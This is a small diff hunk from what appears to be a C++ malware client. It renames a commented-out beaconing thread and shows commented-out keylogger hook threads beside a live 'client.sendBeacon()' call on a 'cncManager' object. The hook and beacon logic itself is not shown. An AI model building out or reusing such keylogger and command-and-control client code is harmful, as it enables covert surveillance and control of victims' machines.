@@ -17,8 +17,8 @@ int main() {
 //std::thread keyLog = std::thread(&keyLogger::startHook, logger);
 //keyLog.join();
     client.print_setting = true;
-    //std::thread fileHandler = std::thread(&cncManager::sendBeacon, client);
-    //fileHandler.detach();
+    //std::thread Beacon = std::thread(&cncManager::sendBeacon, client);
+    //Beacon.detach();
     client.sendBeacon();
 
 
